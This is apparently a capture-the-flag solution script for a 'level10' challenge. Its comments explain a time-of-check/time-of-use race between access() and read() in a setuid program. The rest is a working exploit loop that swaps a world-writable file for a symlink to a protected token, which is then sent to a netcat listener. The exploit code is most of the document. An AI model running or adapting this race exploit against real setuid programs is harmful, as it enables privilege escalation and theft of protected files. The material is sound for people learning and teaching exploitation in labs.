# There is a race condition that is exploitable in the code
# The access function tests for the real user so a symbolic link will fail its
# test. But later on the read function is what is used to actually read the file.
# The read function only tests for the effective user
# wich means a symbolic link to the token will
# be read because the level10 file itself has read rights to the file.

# What we have to do is to pass in 'link' as an arg which in the beginning
# is just a file that will pass the access test by being set to 777. But after
# that we switch this file to a symbolic link to the token that will be read 
# by the read function and sent to our netcat server.

############# CLIENT #############
while :
do
	unlink link
	touch link
	chmod 777 link

	### nice makes the program run slower
	nice -n 20 ~/level10 link 127.0.0.1 &

	### add a small loop to better time the switch
	for i in {1...100}
	do
		echo i > /dev/null
	done

	### switch the file that passes the access test with a symbolic link
	### to the token file that passes the read function
	ln -sf ~/token link
done

